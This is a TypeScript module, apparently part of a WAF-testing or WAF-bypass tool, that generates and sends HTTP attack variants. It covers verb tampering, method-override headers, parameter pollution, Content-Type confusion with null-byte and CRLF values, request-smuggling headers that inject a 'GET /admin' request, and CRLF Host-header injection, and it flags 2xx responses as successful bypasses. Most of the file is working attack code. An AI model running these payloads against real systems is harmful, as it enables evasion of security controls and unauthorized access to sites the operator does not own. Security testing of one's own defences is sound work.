// HTTP Protocol Manipulation Module
// Advanced techniques for bypassing WAF through HTTP protocol manipulation
// Includes Verb Tampering, Parameter Pollution, Content-Type confusion

export interface HTTPManipulationOptions {
  enableVerbTampering?: boolean;
  enableParameterPollution?: boolean;
  enableContentTypeConfusion?: boolean;
  enableRequestSmuggling?: boolean;
  enableHostHeaderInjection?: boolean;
}

export interface ManipulatedRequest {
  method: string;
  url: string;
  headers: Record<string, string>;
  body?: string;
  technique: string;
  description: string;
}

export class HTTPManipulator {

  /**
   * Get uncommon HTTP methods for verb tampering
   */
  static getUncommonMethods(): string[] {
    return [
      'PATCH',
      'TRACE',
      'OPTIONS',
      'HEAD',
      'CONNECT',
      'PROPFIND',
      'PROPPATCH',
      'MKCOL',
      'COPY',
      'MOVE',
      'LOCK',
      'UNLOCK',
      'CHECKOUT',
      'CHECKIN',
      'REPORT',
      'MKWORKSPACE',
      'UPDATE',
      'LABEL',
      'MERGE',
      'BASELINE-CONTROL',
      'MKACTIVITY',
      'ORDERPATCH',
      'ACL',
      'SEARCH',
      'VERSION-CONTROL'
    ];
  }

  /**
   * Generate HTTP method override variations
   */
  static generateMethodOverrides(originalMethod: string, targetMethod: string): Record<string, string>[] {
    return [
      { 'X-HTTP-Method-Override': targetMethod },
      { 'X-HTTP-Method': targetMethod },
      { 'X-Method-Override': targetMethod },
      { '_method': targetMethod }, // Form parameter
      { 'X-Original-HTTP-Method': originalMethod, 'X-HTTP-Method-Override': targetMethod },
      { 'X-Forwarded-Method': targetMethod },
      { 'X-Requested-Method': targetMethod }
    ];
  }

  /**
   * Generate parameter pollution variations
   */
  static generateParameterPollution(paramName: string, payload: string): string[] {
    const variations = [
      // Standard parameter pollution
      `${paramName}=${encodeURIComponent(payload)}&${paramName}=${encodeURIComponent(payload)}`,

      // Case variation pollution
      `${paramName}=${encodeURIComponent(payload)}&${paramName.toUpperCase()}=${encodeURIComponent(payload)}`,

      // Array notation pollution
      `${paramName}[]=${encodeURIComponent(payload)}&${paramName}[]=${encodeURIComponent(payload)}`,

      // Empty parameter pollution
      `${paramName}=${encodeURIComponent(payload)}&${paramName}=`,
      `${paramName}=&${paramName}=${encodeURIComponent(payload)}`,

      // Space variations in parameter names
      `${paramName}=${encodeURIComponent(payload)}&${paramName}%20=${encodeURIComponent(payload)}`,
      `${paramName}=${encodeURIComponent(payload)}&%20${paramName}=${encodeURIComponent(payload)}`,

      // Special character variations
      `${paramName}=${encodeURIComponent(payload)}&${paramName}.=${encodeURIComponent(payload)}`,
      `${paramName}=${encodeURIComponent(payload)}&${paramName}_=${encodeURIComponent(payload)}`,

      // Encoded parameter name pollution
      `${paramName}=${encodeURIComponent(payload)}&${encodeURIComponent(paramName)}=${encodeURIComponent(payload)}`,

      // Double encoded variations
      `${paramName}=${encodeURIComponent(encodeURIComponent(payload))}&${paramName}=${encodeURIComponent(payload)}`,

      // Semicolon separator (instead of &)
      `${paramName}=${encodeURIComponent(payload)};${paramName}=${encodeURIComponent(payload)}`,

      // Multiple values in single parameter
      `${paramName}=${encodeURIComponent(payload)},${encodeURIComponent(payload)}`,

      // JSON-style parameter pollution
      `${paramName}[0]=${encodeURIComponent(payload)}&${paramName}[1]=${encodeURIComponent(payload)}`,

      // PHP-style array pollution
      `${paramName}[a]=${encodeURIComponent(payload)}&${paramName}[b]=${encodeURIComponent(payload)}`,

      // ASP.NET style pollution
      `${paramName}.x=${encodeURIComponent(payload)}&${paramName}.y=${encodeURIComponent(payload)}`,

      // Unicode parameter name variations
      `${paramName}=${encodeURIComponent(payload)}&\\u${paramName.charCodeAt(0).toString(16).padStart(4, '0')}\\u${paramName.charCodeAt(1).toString(16).padStart(4, '0')}=${encodeURIComponent(payload)}`
    ];

    return variations.filter((v, i, arr) => arr.indexOf(v) === i); // Remove duplicates
  }

  /**
   * Generate Content-Type confusion headers
   */
  static getContentTypeVariations(): Record<string, string>[] {
    return [
      { 'Content-Type': 'application/json' },
      { 'Content-Type': 'application/x-www-form-urlencoded' },
      { 'Content-Type': 'multipart/form-data' },
      { 'Content-Type': 'text/plain' },
      { 'Content-Type': 'text/xml' },
      { 'Content-Type': 'application/xml' },
      { 'Content-Type': 'text/html' },

      // Charset variations
      { 'Content-Type': 'application/json; charset=utf-8' },
      { 'Content-Type': 'application/json;charset=utf-8' }, // No space
      { 'Content-Type': 'application/json; charset=iso-8859-1' },
      { 'Content-Type': 'application/json; charset=utf-16' },

      // Case variations
      { 'Content-Type': 'Application/Json' },
      { 'Content-Type': 'APPLICATION/JSON' },
      { 'content-type': 'application/json' }, // Lowercase header name

      // Boundary variations (for multipart)
      { 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary' },
      { 'Content-Type': 'multipart/form-data; boundary=' },

      // Invalid/malformed Content-Types
      { 'Content-Type': 'application/json\x00' }, // Null byte
      { 'Content-Type': 'application/json\r\n' }, // CRLF
      { 'Content-Type': 'application/json ' }, // Trailing space
      { 'Content-Type': ' application/json' }, // Leading space

      // Double Content-Type headers (parameter pollution)
      { 'Content-Type': 'text/plain', 'content-type': 'application/json' },

      // Uncommon but valid Content-Types
      { 'Content-Type': 'application/x-amf' },
      { 'Content-Type': 'application/msgpack' },
      { 'Content-Type': 'application/cbor' },
      { 'Content-Type': 'application/x-protobuf' }
    ];
  }

  /**
   * Generate request smuggling payloads
   */
  static generateRequestSmugglingHeaders(): Record<string, string>[] {
    return [
      // Transfer-Encoding variations
      { 'Transfer-Encoding': 'chunked' },
      { 'Transfer-Encoding': 'chunked\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com' },
      { 'transfer-encoding': 'chunked' }, // Lowercase
      { 'Transfer-Encoding': ' chunked' }, // Leading space
      { 'Transfer-Encoding': 'chunked ' }, // Trailing space
      { 'Transfer-Encoding': 'chunked\x00' }, // Null byte

      // Content-Length conflicts
      { 'Content-Length': '0', 'Transfer-Encoding': 'chunked' },
      { 'Content-Length': '5', 'Transfer-Encoding': 'chunked' },

      // Double headers
      { 'Content-Length': '0', 'content-length': '100' },
      { 'Transfer-Encoding': 'chunked', 'transfer-encoding': 'identity' },

      // HTTP/1.1 vs HTTP/1.0 confusion
      { 'Connection': 'keep-alive', 'Transfer-Encoding': 'chunked' },
      { 'Connection': 'close', 'Content-Length': '0' }
    ];
  }

  /**
   * Generate Host header injection variations
   */
  static generateHostHeaderVariations(originalHost: string, injectedHost: string): Record<string, string>[] {
    return [
      // Basic host header injection
      { 'Host': injectedHost },

      // Multiple host headers
      { 'Host': originalHost, 'host': injectedHost },

      // Host override headers
      { 'Host': originalHost, 'X-Forwarded-Host': injectedHost },
      { 'Host': originalHost, 'X-Original-Host': injectedHost },
      { 'Host': originalHost, 'X-Host': injectedHost },
      { 'Host': originalHost, 'X-Forwarded-Server': injectedHost },

      // Port confusion
      { 'Host': `${originalHost}:80@${injectedHost}` },
      { 'Host': `${injectedHost}:80` },

      // URL confusion
      { 'Host': `${originalHost}\\@${injectedHost}` },
      { 'Host': `${originalHost}.${injectedHost}` },

      // CRLF injection in Host header
      { 'Host': `${originalHost}\r\nX-Injected-Header: ${injectedHost}` },
      { 'Host': `${originalHost}%0d%0aX-Injected-Header: ${injectedHost}` },

      // Unicode variations
      { 'Host': `${originalHost}\\u002e${injectedHost}` },

      // Absolute URL in Host header
      { 'Host': `http://${injectedHost}` },
      { 'Host': `https://${injectedHost}` }
    ];
  }

  /**
   * Generate manipulated requests for testing
   */
  static generateManipulatedRequests(
    originalUrl: string,
    originalMethod: string = 'GET',
    payload: string = 'test',
    options: HTTPManipulationOptions = {}
  ): ManipulatedRequest[] {
    const requests: ManipulatedRequest[] = [];
    const parsedUrl = new URL(originalUrl);

    // HTTP Verb Tampering
    if (options.enableVerbTampering !== false) {
      const uncommonMethods = this.getUncommonMethods();
      uncommonMethods.forEach(method => {
        requests.push({
          method,
          url: originalUrl,
          headers: {},
          technique: 'HTTP Verb Tampering',
          description: `Using uncommon HTTP method: ${method}`
        });
      });

      // Method override techniques
      const overrides = this.generateMethodOverrides(originalMethod, 'POST');
      overrides.forEach((headers, index) => {
        requests.push({
          method: originalMethod,
          url: originalUrl,
          headers,
          technique: 'HTTP Method Override',
          description: `Method override using headers: ${Object.keys(headers).join(', ')}`
        });
      });
    }

    // Parameter Pollution
    if (options.enableParameterPollution !== false) {
      const pollutionVariations = this.generateParameterPollution('test', payload);
      pollutionVariations.forEach((queryString, index) => {
        const manipulatedUrl = `${parsedUrl.origin}${parsedUrl.pathname}?${queryString}`;
        requests.push({
          method: 'GET',
          url: manipulatedUrl,
          headers: {},
          technique: 'Parameter Pollution',
          description: `Parameter pollution variation #${index + 1}`
        });
      });
    }

    // Content-Type Confusion
    if (options.enableContentTypeConfusion !== false) {
      const contentTypes = this.getContentTypeVariations();
      contentTypes.forEach(headers => {
        requests.push({
          method: 'POST',
          url: originalUrl,
          headers,
          body: `test=${encodeURIComponent(payload)}`,
          technique: 'Content-Type Confusion',
          description: `Content-Type manipulation: ${headers['Content-Type'] || headers['content-type']}`
        });
      });
    }

    // Request Smuggling
    if (options.enableRequestSmuggling !== false) {
      const smugglingHeaders = this.generateRequestSmugglingHeaders();
      smugglingHeaders.forEach(headers => {
        requests.push({
          method: 'POST',
          url: originalUrl,
          headers,
          body: 'test=smuggled',
          technique: 'HTTP Request Smuggling',
          description: `Request smuggling using: ${Object.keys(headers).join(', ')}`
        });
      });
    }

    // Host Header Injection
    if (options.enableHostHeaderInjection !== false) {
      const hostVariations = this.generateHostHeaderVariations(parsedUrl.host, 'waf-test.invalid');
      hostVariations.forEach(headers => {
        requests.push({
          method: 'GET',
          url: originalUrl,
          headers,
          technique: 'Host Header Injection',
          description: `Host header manipulation: ${headers.Host || headers.host}`
        });
      });
    }

    return requests;
  }

  /**
   * Execute manipulated request
   */
  static async executeManipulatedRequest(
    request: ManipulatedRequest,
    followRedirects: boolean = false
  ): Promise<{
    status: number | string;
    responseTime: number;
    headers: Record<string, string>;
    technique: string;
    description: string;
  }> {
    const startTime = Date.now();

    try {
      const response = await fetch(request.url, {
        method: request.method,
        headers: new Headers(request.headers),
        body: request.body,
        redirect: followRedirects ? 'follow' : 'manual'
      });

      const responseTime = Date.now() - startTime;
      const responseHeaders: Record<string, string> = {};
      response.headers.forEach((value, key) => {
        responseHeaders[key] = value;
      });

      return {
        status: response.status,
        responseTime,
        headers: responseHeaders,
        technique: request.technique,
        description: request.description,
        method: request.method,
        testType: request.technique,
        bypassed: response.status >= 200 && response.status < 300 && response.status !== 403
      };

    } catch (error) {
      const responseTime = Date.now() - startTime;
      return {
        status: 'ERR',
        responseTime,
        headers: {},
        technique: request.technique,
        description: request.description,
        method: request.method,
        testType: request.technique,
        bypassed: false
      };
    }
  }

  /**
   * Batch execute multiple manipulated requests
   */
  static async batchExecuteRequests(
    requests: ManipulatedRequest[],
    followRedirects: boolean = false,
    concurrency: number = 5
  ): Promise<any[]> {
    const results = [];

    // Execute requests in batches to avoid overwhelming the target
    for (let i = 0; i < requests.length; i += concurrency) {
      const batch = requests.slice(i, i + concurrency);
      const batchResults = await Promise.all(
        batch.map(request => this.executeManipulatedRequest(request, followRedirects))
      );
      results.push(...batchResults);

      // Small delay between batches to be respectful
      if (i + concurrency < requests.length) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    }

    return results;
  }

  /**
   * Analyze results for bypass opportunities
   */
  static analyzeResults(results: any[]): {
    successfulTechniques: string[];
    suspiciousTechniques: string[];
    recommendations: string[];
  } {
    const successful = results.filter(r =>
      typeof r.status === 'number' &&
      ((r.status >= 200 && r.status < 300) || (r.status >= 500 && r.status < 600))
    );

    const blocked = results.filter(r => r.status === 403);
    const suspicious = results.filter(r =>
      typeof r.status === 'number' && r.status >= 400 && r.status < 500 && r.status !== 403
    );

    const successfulTechniques = [...new Set(successful.map(r => r.technique))];
    const suspiciousTechniques = [...new Set(suspicious.map(r => r.technique))];

    const recommendations = [];

    if (successfulTechniques.length > 0) {
      recommendations.push(`✅ ${successfulTechniques.length} bypass techniques worked: ${successfulTechniques.join(', ')}`);
    }

    if (suspiciousTechniques.length > 0) {
      recommendations.push(`⚠️ ${suspiciousTechniques.length} techniques returned non-403 errors: ${suspiciousTechniques.join(', ')}`);
    }

    if (blocked.length === results.length) {
      recommendations.push('🛡️ All requests were blocked (403) - WAF is working effectively');
    } else if (blocked.length > 0) {
      recommendations.push(`🔄 ${blocked.length}/${results.length} requests blocked - partial protection`);
    }

    return {
      successfulTechniques,
      suspiciousTechniques,
      recommendations
    };
  }
}

// Export specific techniques for targeted testing
export const VerbTampering = {
  uncommonMethods: HTTPManipulator.getUncommonMethods(),
  generateOverrides: HTTPManipulator.generateMethodOverrides
};

export const ParameterPollution = {
  generate: HTTPManipulator.generateParameterPollution
};

export const ContentTypeConfusion = {
  variations: HTTPManipulator.getContentTypeVariations()
};

export const RequestSmuggling = {
  headers: HTTPManipulator.generateRequestSmugglingHeaders()
};

export const HostHeaderInjection = {
  generate: HTTPManipulator.generateHostHeaderVariations
};
